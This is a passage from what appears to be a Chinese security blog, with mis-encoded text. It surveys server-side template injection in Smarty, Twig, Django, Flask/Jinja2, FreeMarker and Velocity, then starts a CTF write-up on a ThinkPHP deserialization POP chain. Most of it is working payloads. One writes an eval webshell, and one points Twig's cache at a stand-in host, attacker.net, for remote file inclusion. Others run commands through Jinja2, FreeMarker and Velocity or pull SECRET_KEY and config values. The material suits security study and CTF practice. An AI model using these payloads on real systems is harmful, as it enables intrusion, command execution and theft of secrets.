Smarty_Internal_Write_File&#123; /** * Writes file in a safe way to disk * * @param string $_filepath complete filepath * @param string $_contents file content * @param Smarty $smarty smarty instance * * @throws SmartyException * @return boolean true */ public function writeFile($_filepath, $_contents, Smarty $smarty) &#123; $_error_reporting = error_reporting(); error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING); if ($smarty-&gt;_file_perms !== null) &#123; $old_umask = umask(0); &#125; $_dirpath = dirname($_filepath); // if subdirs, create dir structure if ($_dirpath !== &#x27;.&#x27; &amp;&amp; !file_exists($_dirpath)) &#123; mkdir($_dirpath, $smarty-&gt;_dir_perms === null ? 0777 : $smarty-&gt;_dir_perms, true); &#125; // write to tmp file, then move to overt file lock race condition $_tmp_file = $_dirpath . DS . str_replace(array(&#x27;.&#x27;, &#x27;,&#x27;), &#x27;_&#x27;, uniqid(&#x27;wrt&#x27;, true)); if (!file_put_contents($_tmp_file, $_contents)) &#123; error_reporting($_error_reporting); throw new SmartyException(&quot;unable to write file &#123;$_tmp_file&#125;&quot;); &#125; /* * Windows&#x27; rename() fails if the destination exists, * Linux&#x27; rename() properly handles the overwrite. * Simply unlink()ing a file might cause other processes * currently reading that file to fail, but linux&#x27; rename() * seems to be smart enough to handle that for us. */ if (Smarty::$_IS_WINDOWS) &#123; // remove original file if (is_file($_filepath)) &#123; @unlink($_filepath); &#125; // rename tmp file $success = @rename($_tmp_file, $_filepath); &#125; else &#123; // rename tmp file $success = @rename($_tmp_file, $_filepath); if (!$success) &#123; // remove original file if (is_file($_filepath)) &#123; @unlink($_filepath); &#125; // rename tmp file $success = @rename($_tmp_file, $_filepath); &#125; &#125; if (!$success) &#123; error_reporting($_error_reporting); throw new SmartyException(&quot;unable to write file &#123;$_filepath&#125;&quot;); &#125; if ($smarty-&gt;_file_perms !== null) &#123; // set file permissions chmod($_filepath, $smarty-&gt;_file_perms); umask($old_umask); &#125; error_reporting($_error_reporting); return true; &#125;&#125; å¯ä»¥çœ‹åˆ°writeFileå‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°ä¸€ä¸ª Smarty ç±»å‹ï¼Œåæ¥æ‰¾åˆ°äº† self::clearConfig()ï¼Œå‡½æ•°åŸå‹ï¼š 1234public function clearConfig($varname = null)&#123; return Smarty_Internal_Extension_Config::clearConfig($this, $varname);&#125; å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadå†™ä¸ªwebshell: 1&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125; Twigç›¸æ¯”äº Smarty ,Twig æ— æ³•è°ƒç”¨é™æ€æ–¹æ³•ï¼Œå¹¶ä¸”æ‰€æœ‰å‡½æ•°çš„è¿”å›å€¼éƒ½è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ self:: è°ƒç”¨é™æ€å˜é‡äº†ï¼Œä½†æ˜¯ é€šè¿‡å®˜æ–¹æ–‡æ¡£çš„æŸ¥è¯¢ï¼šTwig ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ª _self, è™½ç„¶ _self æœ¬èº«æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„æ–¹æ³•ï¼Œä½†æ˜¯å´æœ‰ä¸€ä¸ª envã€‚ envæ˜¯æŒ‡å±æ€§Twig_Environmentå¯¹è±¡ï¼ŒTwig_Environmentå¯¹è±¡æœ‰ä¸€ä¸ª setCacheæ–¹æ³•å¯ç”¨äºæ›´æ”¹Twigå°è¯•åŠ è½½å’Œæ‰§è¡Œç¼–è¯‘æ¨¡æ¿ï¼ˆPHPæ–‡ä»¶ï¼‰çš„ä½ç½®(ä¸çŸ¥é“ä¸ºä»€ä¹ˆå®˜æ–¹æ–‡æ¡£æ²¡æœ‰çœ‹åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œåæ¥æ‰¾åˆ°äº†Twig çš„æºç ä¸­çš„ environment.phpï¼‰ å› æ­¤ï¼Œæ˜æ˜¾çš„æ”»å‡»æ˜¯é€šè¿‡å°†ç¼“å­˜ä½ç½®è®¾ç½®ä¸ºè¿œç¨‹æœåŠ¡å™¨æ¥å¼•å…¥è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼š payload: 1&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125; ä½†æ˜¯æ–°çš„é—®é¢˜å‡ºç°äº†ï¼Œallow_url_include ä¸€èˆ¬æ˜¯ä¸æ‰“å¼€çš„ï¼Œæ²¡æ³•åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œæ²¡å…³ç³»è¿˜æœ‰ä¸ªè°ƒç”¨è¿‡æ»¤å™¨çš„å‡½æ•° getFilter() è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†ä¸€ä¸ª call_user_function æ–¹æ³• 123456789101112131415public function getFilter($name)&#123; [snip] foreach ($this-&gt;filterCallbacks as $callback) &#123; if (false !== $filter = call_user_func($callback, $name)) &#123;//æ³¨æ„è¿™è¡Œ return $filter; &#125; &#125; return false;&#125;public function registerUndefinedFilterCallback($callable)&#123; $this-&gt;filterCallbacks[] = $callable;&#125; æˆ‘ä»¬åªè¦æŠŠexec() ä½œä¸ºå›è°ƒå‡½æ•°ä¼ è¿›å»å°±èƒ½å®ç°å‘½ä»¤æ‰§è¡Œäº† payload: 1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125; PythonDjango123def view(request, *args, **kwargs): template = &#x27;Hello &#123;user&#125;, This is your email: &#x27; + request.GET.get(&#x27;email&#x27;) return HttpResponse(template.format(user=request.user)) æ³¨å…¥ç‚¹å¾ˆæ˜æ˜¾å°±æ˜¯ emailï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬çš„èƒ½åŠ›å·²ç»è¢«é™åˆ¶çš„å¾ˆæ­»ï¼Œå¾ˆéš¾æ‰§è¡Œå‘½ä»¤ï¼Œä½†åˆæƒ³è·å–å’Œ User æœ‰å…³çš„é…ç½®ä¿¡æ¯çš„è¯ï¼Œæ€ä¹ˆåŠï¼Ÿ å¯ä»¥å‘ç°æˆ‘ä»¬ç°åœ¨æ‹¿åˆ°çš„åªæœ‰æœ‰ä¸€ä¸ª å’Œuser æœ‰å…³çš„å˜é‡ï¼Œé‚£å°±æ˜¯ request user ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯æ˜¯ä»€ä¹ˆï¼Ÿ pç‰›åœ¨è‡ªå·±çš„åšå®¢ä¸­åˆ†äº«äº†è¿™ä¸ªæ€è·¯ï¼Œæˆ‘æŠŠå®ƒå¼•ç”¨è¿‡æ¥ï¼š Djangoæ˜¯ä¸€ä¸ªåºå¤§çš„æ¡†æ¶ï¼Œå…¶æ•°æ®åº“å…³ç³»é”™ç»¼å¤æ‚ï¼Œæˆ‘ä»¬å…¶å®æ˜¯å¯ä»¥é€šè¿‡å±æ€§ä¹‹é—´çš„å…³ç³»å»ä¸€ç‚¹ç‚¹æŒ–æ˜æ•æ„Ÿä¿¡æ¯ã€‚ä½†Djangoä»…ä»…æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œåœ¨æ²¡æœ‰ç›®æ ‡æºç çš„æƒ…å†µä¸‹å¾ˆéš¾å»æŒ–æ˜ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘çš„æ€è·¯å°±æ˜¯ï¼šå»æŒ–æ˜Djangoè‡ªå¸¦çš„åº”ç”¨ä¸­çš„ä¸€äº›è·¯å¾„ï¼Œæœ€ç»ˆè¯»å–åˆ°Djangoçš„é…ç½®é¡¹ ä»€ä¹ˆæ„æ€ï¼Œç®€å•åœ°è¯´å°±æ˜¯æˆ‘ä»¬åœ¨æ²¡æœ‰åº”ç”¨æºç çš„æƒ…å†µä¸‹è¦å­¦ä¼šå»å¯»æ‰¾æ¡†æ¶æœ¬èº«çš„å±æ€§ï¼Œçœ‹è¿™ä¸ªç©ºæ¡†æ¶æœ‰ä»€ä¹ˆå±æ€§å’Œç±»ä¹‹é—´çš„å¼•ç”¨ï¼Œç„¶åä¸€æ­¥ä¸€æ­¥çš„é è¿‘æˆ‘ä»¬çš„ç›®æ ‡ åæ¥å‘ç°Djangoè‡ªå¸¦çš„åº”ç”¨â€œadminâ€ï¼ˆä¹Ÿå°±æ˜¯Djangoè‡ªå¸¦çš„åå°ï¼‰çš„models.pyä¸­å¯¼å…¥äº†å½“å‰ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼š æ‰€ä»¥ï¼Œæ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼šæˆ‘ä»¬åªéœ€è¦é€šè¿‡æŸç§æ–¹å¼ï¼Œæ‰¾åˆ°Djangoé»˜è®¤åº”ç”¨adminçš„modelï¼Œå†é€šè¿‡è¿™ä¸ªmodelè·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€WebåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯ã€‚ 123?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; Flask/jinja2Flaskæ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è½»é‡çº§ Web åº”ç”¨æ¡†æ¶ã€‚å…¶ WSGI å·¥å…·ç®±é‡‡ç”¨ Werkzeug ï¼Œæ¨¡æ¿å¼•æ“åˆ™ä½¿ç”¨ Jinja2 ä¸¾ä¸ªä¾‹å­ï¼š 1234567891011121314151617181920from flask import Flask, request, render_template_string, render_templateapp = Flask(__name__)@app.route(&#x27;/hello-template-injection&#x27;)def hello_ssti(): person = &#123;&#x27;name&#x27;:&quot;world&quot;, &#x27;secret&#x27;:&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;&#125; if request.args.get(&#x27;name&#x27;): person[&#x27;name&#x27;] = request.args.get(&#x27;name&#x27;) template = &#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27; % person[&#x27;name&#x27;] return render_template_string(template, person=person)def get_user_file(f_name): with open(f_name) as f: return f.readlines() app.jinja_env.globals[&#x27;get_user_file&#x27;] = get_user_fileif __name__ == &quot;__main__&quot;: app.debug = True app.run(host=&quot;0.0.0.0&quot;) æˆ‘ä»¬å°±å¯ä»¥SSTIå°†secretæ³„éœ²å‡ºæ¥ 1hello-template-injection?name&#x3D;MoonBack.&#123;&#123;person.secret&#125;&#125; åŒæ ·æˆ‘ä»¬å¯ä»¥ç”¨get_user_fileè¯»å–æ–‡ä»¶ å‡è®¾æˆ‘ä»¬ç”¨ä¸‹é¢çš„payload: 1&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;ipconfig&#39;).read()&#125;&#125; æˆ‘ä»¬å°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ è€Œæ¼æ´ç‚¹å°±å­˜åœ¨äºï¼š 12template = &#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27; % person[&#x27;name&#x27;]return render_template_string(template, person=person) å¦‚æœæ”¹æˆ 1234567891011from flask import Flask, request, render_templateapp = Flask(__name__)@app.route(&#x27;/hello-template-injection&#x27;)def hello_ssti(): person = &#123;&#x27;name&#x27;:&quot;world&quot;, &#x27;secret&#x27;:&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;&#125; if request.args.get(&#x27;name&#x27;): person[&#x27;name&#x27;] = request.args.get(&#x27;name&#x27;) return render_template(&quot;index.html&quot;,title=&#x27;Home&#x27;,username=person[&#x27;name&#x27;])if __name__ == &quot;__main__&quot;: app.debug = True app.run(host=&quot;0.0.0.0&quot;) å†åœ¨templatesç›®å½•é‡Œå†™å…¥index.html 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, &#123;&#123;username&#125;&#125;&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; å†è®¿é—®å‘ç°å°±æ²¡èƒ½æˆåŠŸè§£æå‡ºsecret æ¼æ´æˆå› åœ¨äºï¼šrender_template_stringå‡½æ•°åœ¨æ¸²æŸ“æ¨¡æ¿çš„æ—¶å€™ä½¿ç”¨äº†%sæ¥åŠ¨æ€çš„æ›¿æ¢å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬çŸ¥é“Flask ä¸­ä½¿ç”¨äº†Jinja2 ä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œä¸¤ä¸ªå¤§æ‹¬å·åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠä¸¤ä¸ªå¤§æ‹¬å·åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚ è·å–å…¨å±€é…ç½®æ–‡ä»¶configæ˜¯Flaskæ¨¡ç‰ˆä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå®ƒä»£è¡¨â€å½“å‰é…ç½®å¯¹è±¡(flask.config)â€ï¼Œå®ƒæ˜¯ä¸€ä¸ªç±»å­—å…¸çš„å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒåŒ…å«äº†æ¯”å¦‚æ•°æ®åº“é“¾æ¥å­—ç¬¦ä¸²ï¼Œè¿æ¥åˆ°ç¬¬ä¸‰æ–¹çš„å‡­è¯ï¼ŒSECRET_KEYç­‰æ•æ„Ÿå€¼ã€‚ 12345&#123;&#123;config&#125;&#125;&#123;&#123;person.secret&#125;&#125;&#123;&#123;self.__dict__&#125;&#125;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125; å‘½ä»¤æ‰§è¡Œç›´æ¥ç”¨Vlunhubä¸Šçš„expï¼šhttps://github.com/vulhub/vulhub/tree/master/flask/ssti 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Tornadoå‚è§æŠ¤ç½‘æ¯çš„ä¸€é“é¢˜ï¼šhttps://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado JavafreeMarkerè¿™ä¸ªæ¨¡æ¿ä¸»è¦ç”¨äº java ,ç²—ç•¥å¾—çŸ¥newä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å®ç° TemplateModel æ¥ç”¨ new åˆ›å»ºä»»æ„ Java å¯¹è±¡ payloadï¼š 123&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;&lt;#assignob=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125; VelocityVelocity åŒæ ·æ˜¯ä¸€æ¬¾å¤‡å—æ¬¢è¿çš„æ¨¡æ¿è¯­è¨€ã€‚ç„¶è€Œå®ƒæ²¡æœ‰é»˜è®¤å˜é‡åˆ—è¡¨å’Œ å®‰å…¨é—®é¢˜ é¡µé¢å¸®åŠ©æˆ‘ä»¬æ„å»º payloadã€‚ä¸‹é¢å±•ç¤ºäº† Burp Intruder åœ¨æšä¸¾å˜é‡åæ—¶çš„æˆªå›¾ï¼šï¼ˆå˜é‡ååœ¨ payload è¡Œï¼ŒæœåŠ¡å™¨ç»“æœåœ¨å…¶å³è¾¹ï¼‰ï¼š è¿™å¹…å›¾ä¸­ï¼Œè¢«é«˜äº®çš„ class èƒ½è¿”å›å¯¹è±¡ï¼Œçœ‹ä¸Šå»ååˆ†æœ‰è¶£ã€‚è°·æ­Œä¸€ä¸‹ï¼Œæˆ‘ä»¬å‘ç°äº†å¦‚ä¸‹æè¿°ï¼šClassToolï¼šåœ¨æ¨¡æ¿ä¸­å®ç°Javaçš„åå°„ï¼Œé»˜è®¤å‚æ•°ï¼š$key è¿™é‡Œæœ‰å‡ ä¸ªå¯åˆ©ç”¨çš„æ–¹æ³•å’Œå±æ€§ï¼š$class.inspect(class/object/string)ï¼šè¿”å›æ­£åœ¨å®¡æŸ¥ç±»æˆ–å¯¹è±¡çš„ClassToolå®ä¾‹$class.typeï¼šè¿”å›è¢«å®¡æŸ¥çš„ç±» æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªç±»è·å¾—ä»»æ„å¯¹è±¡ä¿¡æ¯ã€‚å†åˆ©ç”¨ç›®æ ‡çš„Runtime.exec()æ‰§è¡Œä»»æ„å‘½ä»¤å—¯ã€‚é€šè¿‡å¦‚ä¸‹æ¨¡æ¿ï¼Œæˆ‘ä»¬å¯ä»¥éªŒè¯è¿™ä¸€ç‚¹ï¼š 1$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor() //å»¶è¿Ÿäº†5ç§’ å¾—åˆ° shell å‘½ä»¤è¾“å‡ºæœ‰ç‚¹éº»çƒ¦ï¼ˆæ¯•ç«Ÿjavaï¼‰ï¼š 12345678910#set($str=$class.inspect(&quot;java.lang.String&quot;).type)#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end //è¾“å‡º tomcat7 å‚è€ƒï¼š https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹SSTIæ¼æ´/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ssti","slug":"ssti","permalink":"http://www.m00nback.xyz/tags/ssti/"}]},{"title":"buuctfæ–°æ˜¥çº¢åŒ…é¢˜writeup","slug":"buuctfæ–°æ˜¥çº¢åŒ…é¢˜writeup","date":"2020-02-10T06:03:27.000Z","updated":"2020-02-11T13:23:39.639Z","comments":true,"path":"2020/02/10/buuctfæ–°æ˜¥çº¢åŒ…é¢˜writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/","excerpt":"è®°ä¸€ä¸‹é¢˜ç›®çš„writeupï¼Œæ”¶è·å¾ˆå¤šï¼å¤ªèœäº†ï¼Œé‚£éº½å¤šæ–¹æ³•ä¸€ä¸ªä¸ä¼šï¼ğŸ˜­","text":"è®°ä¸€ä¸‹é¢˜ç›®çš„writeupï¼Œæ”¶è·å¾ˆå¤šï¼å¤ªèœäº†ï¼Œé‚£éº½å¤šæ–¹æ³•ä¸€ä¸ªä¸ä¼šï¼ğŸ˜­ writeupé¢˜ç›®åŸå‹ä¸ºthinkphp 6.0ååºåˆ—åŒ–ï¼Œæ”¹è‡ªäº2019é«˜æ ¡è¿ç»´èµ›ezpop,å¢åŠ äº†ç‚¹éš¾åº¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;?phperror_reporting(0);class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; // ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº $cache_filename = $this-&gt;options[&#x27;prefix&#x27;] . uniqid() . $name; if(substr($cache_filename, -strlen(&#x27;.php&#x27;)) === &#x27;.php&#x27;) &#123; die(&#x27;?&#x27;); &#125; return $cache_filename; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize = $this-&gt;options[&#x27;serialize&#x27;]; return $serialize($data); &#125; public function set($name, $value, $expire = null): bool&#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire = $this-&gt;options[&#x27;expire&#x27;]; &#125; $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // åˆ›å»ºå¤±è´¥ &#125; &#125; $data = $this-&gt;serialize($value); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123; //æ•°æ®å‹ç¼© $data = gzcompress($data, 3); &#125; $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) &#123; return $filename; &#125; return null; &#125;&#125;if (isset($_GET[&#x27;src&#x27;]))&#123; highlight_file(__FILE__);&#125;$dir = &quot;uploads/&quot;;if (!is_dir($dir))&#123; mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]); å…ˆä»‹ç»å‡ ä¸ªæ¦‚å¿µï¼ŒPOPï¼Œå…¨ç§°é¢å‘å±æ€§ç¼–ç¨‹ï¼ˆProperty-Oriented Programingï¼Œå¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾ã€‚POP é“¾çš„æ„é€ å°±æ˜¯å¯»æ‰¾ç¨‹åºå½“å‰ç¯å¢ƒä¸­å·²ç»å®šä¹‰äº†æˆ–è€…èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§ï¼ˆå‡½æ•°æ–¹æ³•ï¼‰ï¼Œå°†ä¸€äº›å¯èƒ½çš„è°ƒç”¨ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´çš„ã€å…·æœ‰ç›®çš„æ€§çš„æ“ä½œã€‚ POPé“¾ï¼šA::__destruct()=&gt;A::save()=&gt;A::store-&gt;set()==b::set()æœ€åè§¦å‘$result = file_put_contents($filename, $data); åˆ†æä¸€ä¸‹ï¼š ååºåˆ—åŒ–æ“ä½œä¼šæ‰§è¡Œ__destruct()æ–¹æ³•ï¼ŒBç±»æ²¡æœ‰è¯¥æ–¹æ³•ï¼Œè€ŒAç±»ä¸­æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è·Ÿè¿›Aç±»çš„__destruct()æ–¹æ³•ï¼Œå‘ç°$this-&gt;autosaveä¸ºç©ºæˆ–è€…0æˆ–falseæ—¶æ‰§è¡Œ$this-&gt;save()æ–¹æ³• è·Ÿè¿›ç¬¬ä¸€è¡Œä»£ç å‘ç°æ‰§è¡Œ$this-&gt;getForStorage()ï¼Œå‡½æ•°é‡Œåˆæ‰§è¡Œäº†$this-&gt;cleanContents()ï¼Œä¼ å‚ä¸ºæ•°ç»„ï¼Œå†è·Ÿè¿›ï¼Œé¦–å…ˆè¿›è¡Œäº†åè½¬é”®å€¼çš„æ“ä½œï¼Œéå†ä¼ è¿‡æ¥çš„æ•°ç»„å‚æ•°ï¼Œå¦‚æœè¯¥æ•°ç»„çš„å€¼ä»ä¸ºæ•°ç»„ï¼Œå–ä¸åè½¬é”®å€¼åæ–°æ•°ç»„é”®åçš„äº¤é›†å­˜åœ¨$contentsæ•°ç»„é‡Œï¼Œé”®ä¸º$contentsçš„é”®ï¼Œç„¶åå°†$this-&gt;completeå’Œå®Œæˆä¸Šé¢æ“ä½œçš„æ–°æ•°ç»„jsonç¼–ç è¿”å› è·Ÿè¿›ç¬¬äºŒè¡Œä»£ç ï¼Œå‘ç°æ‰§è¡Œäº†æŸä¸ªå¯¹è±¡çš„setæ–¹æ³•ï¼Œä¼ äº†ä¸‰ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¯¹è±¡è®¾ä¸ºBï¼Œè·Ÿè¿›ï¼Œé¦–å…ˆåˆ¤æ–­$expireæ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™å–$this-&gt;options[&#39;expire&#39;]ï¼Œç„¶åè°ƒç”¨äº†$this-&gt;getExpireTime()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°†ä¼ çš„å‚æ•°å¼ºåˆ¶intè½¬æ¢ï¼Œç„¶åè°ƒç”¨äº†$this-&gt;getCacheKey()æ–¹æ³•ï¼Œç”Ÿæˆä¸€ä¸ª$this-&gt;options[&#39;prefix&#39;]ï¼Œå¾®ç§’çº§æ—¶é—´æˆ³å’Œä¼ è¿‡æ¥å‚æ•°æ‹¼æ¥æˆçš„æ–‡ä»¶åï¼Œå¹¶ä¸”ä¼ è¿‡æ¥çš„å‚æ•°ä¸èƒ½æ˜¯.php,ç„¶åæ²¡æœ‰åˆ™åˆ›å»ºæ–‡ä»¶å¤¹ï¼Œè‹¥ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°å­—ï¼Œå°±è¿”å›stringç±»å‹è½¬æ¢çš„ç»“æœï¼Œå¦åˆ™è¿”å›$this-&gt;options[&#39;serialize&#39;]($data)ï¼Œå‹ç¼©æ•°æ®ï¼Œæœ€åä¸€ä¸ªæ­»äº¡é€€å‡ºï¼Œæ‹¼æ¥åºåˆ—åŒ–çš„ç»“æœå†™å…¥æ‹¼æ¥æˆçš„æ–‡ä»¶å†… å¤§æ¦‚æ€è·¯å·²ç»æ¸…æ™°ï¼Œbypassä¸€äº›é™åˆ¶ï¼š æ–‡ä»¶åé‚£é‡Œå¯ä»¥ç”¨.php/.è€Œç»•è¿‡ æ­»äº¡é€€å‡ºé‚£ä¸ªåœ°æ–¹å¯ä»¥ç”¨ä¼ªåè®®php://filter/write=convert.base64-decode/resourceè¿›è¡Œbase64è§£ç å†™å…¥ï¼Œå¯å°†shellå…ˆbase64ç¼–ç ï¼Œæ³¨æ„è¦å…ˆæŠŠå‰åŠéƒ¨åˆ†è¡¥é½å»æ‰&lt;?;&gt;()è¿™äº›æ— æ³•è¢«base64çš„å­—ç¬¦ï¼Œphp//exitä¸€å…±9ä¸ªå­—ç¬¦ï¼Œå†åŠ ä¸Š12ä¸ª0ï¼Œå…±21ä¸ªï¼Œbase64ç¼–ç 4ä¸ªä¸€ç»„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å†åŠ 3ä¸ª ä»¥ä¸Šæ˜¯ezpopçš„æ€è·¯ï¼Œé¢˜ç›®çš„å˜é‡ä¾¿æ˜¯æ–‡ä»¶åä¸å¯æ§ï¼Œæœ‰ä¸‰ç§æ€è·¯ï¼š æ–¹å¼1(system)å‚è§å®‰å…¨å®¢æ–‡ç« :https://www.anquanke.com/post/id/194036 